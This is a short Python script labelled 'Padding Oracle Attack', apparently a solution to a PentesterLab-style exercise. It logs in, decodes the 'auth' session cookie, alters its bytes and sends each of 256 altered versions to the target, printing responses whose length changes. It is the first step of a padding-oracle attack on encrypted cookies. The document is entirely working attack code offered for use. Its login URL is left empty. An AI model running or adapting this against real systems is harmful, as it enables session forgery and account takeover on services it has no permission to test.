import requests as req
import urllib, base64

USERNAME = 'REDACTED'
PASSWORD = 'REDACTED'

payload = {'username':USERNAME,'password':PASSWORD}
url = ""

def process(cookie):
        cookie = list(cookie)
        d=cookie
        for i in range(8):
                d[i] = chr(0)
        for char in range(0,256):
                #d = cookie
                d[7] = chr(char)
                bc = urllib.quote(base64.b64encode("".join(d)))
                r = req.get("http://ptl-c3cd197b-59238793.libcurl.so/index.php",cookies={'auth':bc})
                if len(r.text) != 15:
                        print str(char)+"\t"+bc+"\t"+str(len(r.text))
        return

print "::::::Padding Oracle Attack::::::"
r = req.post(url,data=payload,allow_redirects=False)

print "[!] STATUS:\t\t" + str(r.status_code)
auth = (req.utils.dict_from_cookiejar(r.cookies))['auth'];
auth_decoded =  urllib.unquote(auth).decode('utf8')
print "[+] COOKIE:\t" + auth + ' ===> ' + auth_decoded
auth_ciph = base64.b64decode(auth_decoded)

process(auth_ciph)
